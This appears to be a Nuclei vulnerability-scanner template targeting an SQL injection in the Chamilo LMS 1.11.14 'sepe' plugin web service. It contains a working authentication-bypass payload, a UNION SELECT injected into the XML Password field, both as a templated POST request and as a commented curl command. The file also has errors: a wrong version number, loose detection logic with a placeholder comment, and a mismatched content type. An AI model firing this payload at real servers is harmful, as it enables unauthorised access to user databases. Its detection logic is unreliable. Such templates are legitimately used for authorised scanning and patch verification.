id: chamilo-sqli-webservices

info:
  name: Chamilo 1.11.14 - SQL Injection
  author: s1kr10s
  severity: critical
  description: Chamilo 1.1.14 contains a SQL injection vulnerability. There is a plugin with its own web service, which has the authentication vulnerable to SQL injection in the password parameter.
  reference: https://infosecwriteups.com/chamilo-lms-1-11-14-analysis-of-two-blind-sql-injection-vulnerabilities-c04643fe637d
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  metadata:
    max-request: 1
  tags: chamilo,sqli

requests:
  - method: GET
    path:
      - "{{BaseURL}}/plugin/sepe/ws/service.php"
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<?xml version="  # Verify that it is an XML file

    stop-at-first-match: true

  - method: POST
    path:
      - "{{BaseURL}}/plugin/sepe/ws/service.php"

    headers:
      Content-Type: text/xml

    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <root>
        <Username>admin</Username>
        <Password>admin' UNION ALL SELECT '1','4</Password>
      </root>

    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "error"  # Or any other word that confirms that the injection was successful

    # Add additional conditions to stop the flow if the first request fails
    matchers-condition: and

# Using curl
# curl -i -s -k --location --request POST 'http://target.com/cursos/plugin/sepe/ws/service.php' \
#--header 'User-Agent: Mozilla/5.0' \
#--header 'Host: target.com' \
#--header 'Accept-Encoding: gzip, deflate, br' \
#--header 'Cache-Control: max-age=0' \
#--header 'Accept-Language: en-US;q=0.9,en;q=0.8' \
#--header 'Content-Length: 164' \
#--header 'Content-Type: application/x-www-form-urlencoded' \
#--data-raw '<?xml version="1.0" encoding="UTF-8"?>
#      <root>
#        <Username>admin</Username>
#        <Password>admin' UNION ALL SELECT '1','4</Password>
#      </root>'
